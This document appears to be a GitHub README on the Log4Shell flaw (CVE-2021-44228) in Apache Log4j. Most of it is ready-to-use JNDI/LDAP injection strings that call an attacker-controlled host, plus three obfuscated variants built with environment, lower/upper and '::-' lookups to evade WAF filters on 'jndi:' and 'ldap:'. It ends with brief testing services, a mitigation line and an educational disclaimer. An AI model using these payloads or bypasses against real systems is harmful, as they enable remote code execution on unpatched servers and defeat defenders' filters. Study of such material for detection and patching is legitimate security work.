# 📝 Description
🐱‍💻 ✂️ 🤬 LOG4J Java exploit - A trick to bypass words blocking patches

**CVE-2021-44228** works on:

log4j: 2.0 <= Apache log4j <= 2.14.1

Java version already patched: 6u211+, 7u201+, 8u191+,  11.0.1+.

Simple attacker script (Possible RCE):


`${jndi:ldap://somesitehackerofhell.com/z}`

WAF or developers started to block phrases:
- "ldap:"
- "jndi:"
  
to secure applications.


However, the attacker can bypass it by using one of these techniques:

## 1. System environment variables
   
`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}`

From Apache Log4j 2 documentation: `${env:ENV_NAME:-default_value}`

If there is no **ENV_NAME** system environment variable, use text after **:-** 

The attacker can use any name instead of **ENV_NAME**, but it has to no exists.


On windows, you can check your system environment variables in PowerShell by writing:

`dir env:`



## 2. Lower or Upper Lookup

`${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}`

`${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}`

**Lower Lookup**
The LowerLookup converts the passed in argument to lower case. Presumably the value will be the
result of a nested lookup.


`${lower:<text>}`


**Upper Lookup**
The UpperLookup converts the passed in argument to upper case. Presumably the value will be the
result of a nested lookup.


`${upper:<text>}`

## 3. "::-" notation

`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}`



I am not an author of the Lower or Upper Lookup or "::-" bypass or CVE-2021-44228

# Testing
To test entry you can use:

- https://canarytokens.org/generate - Choose token **Log4Shell** (entry notification will be send by email or webhook), generate and replace somesitehackerofhell.com/z
- https://dnslog.cn/ - Generate subdomain and replace somesitehackerofhell.com/z

# ✨ Best solution to protect from CVE-2021-44228
Start your server with `log4j2.formatMsgNoLookups` set to `true`, or update to `log4j-2.15.0-rc1` or later.

Keep it safe!

# 🤝 Show your support

**Give a ⭐️ if you liked the content**

# 📝 Useful links
- [Apache Log4j 2 v. 2.15.0 - User's Guide](https://logging.apache.org/log4j/2.x/log4j-users-guide.pdf)
- [Possible first publication of lower/upper bypass](https://twitter.com/stereotype32/status/1469313856229228544)
- [CVE-2021-44228(Apache Log4j Remote Code Execution](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)

# ✔️ Disclaimer
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
